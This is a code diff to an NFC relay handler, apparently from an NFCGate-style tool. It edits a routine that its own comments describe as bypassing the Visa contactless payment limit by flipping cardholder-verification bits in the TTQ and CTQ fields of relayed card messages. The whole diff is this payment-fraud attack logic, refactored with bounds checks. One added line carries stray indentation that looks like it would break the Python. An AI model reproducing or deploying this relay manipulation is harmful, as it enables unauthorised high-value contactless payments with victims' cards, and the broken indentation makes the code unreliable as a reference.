@@ -67,24 +67,25 @@ class NFCGateClientHandler(socketserver.StreamRequestHandler):
             #Bypass Visa NFC Transaction Payment limit (Salvador Mendoza - salmg.net - @netxing)
             #By modifying CDCVM during the relay
             
-            data2 = [int(x) for x in data] # copy of data
-            
-            for x in range(0,len(data)):
-                if(data[x] == 0x9F and data[x+1] == 0x66):          #TTQ  - (byte 2, bit 7)
+                        data2 = [int(x) for x in data]  # copy of data
+            ttq = False
+
+            for x in range(0, len(data) - 1):
+                if data[x] == 0x9F and data[x + 1] == 0x66:          # TTQ - (byte 2, bit 7)
                     print("!! TTQ detected")
-                    ttq = True                                      #It will check GET PROCESSING
+                    ttq = True                                       # It will check GET PROCESSING
                     break
-                
-                if(ttq and data[x]==0x80 and data[x+1] == 0xa8):    #TTQ  - (byte 2, bit 7) in GET PROCESSING
+
+                if ttq and data[x] == 0x80 and data[x + 1] == 0xA8:  # TTQ - (byte 2, bit 7) in GET PROCESSING
                     print("!! Modifying GET PROCESSING if necessary")
                     ttq = False
-                    if(data[x+8] & (1<<(7-1))):                     # Modify bit 7 in byte 2 to "0" if it is "1"
-                        data2[x+8] = int(bin(data[x+8] ^ (1<<6)),2)
+                    if x + 8 < len(data) and (data[x + 8] & (1 << (7 - 1))):  # Modify bit 7 in byte 2 to "0" if it is "1"
+                        data2[x + 8] = data[x + 8] ^ (1 << 6)
                         break
-                        
-                if(data[x] == 0x9f and data[x+1] == 0x6c):          #CTQ - (byte 2, bit 8)
-                    if(not data[x+8] & (1<<(8-1))):                 # if bit 8 in byte 2 is not 1, flip it to "0"
-                        data2[x+4] = int(bin(data[x+4] ^ (1<<7)),2)
+
+                if data[x] == 0x9F and data[x + 1] == 0x6C:          # CTQ - (byte 2, bit 8)
+                    if x + 8 < len(data) and not (data[x + 8] & (1 << (8 - 1))):  # if bit 8 in byte 2 is not 1, flip it to "0"
+                        data2[x + 4] = data[x + 4] ^ (1 << 7)
                         break
             #print('[{}]'.format(', '.join(hex(x) for x in data2)))
             
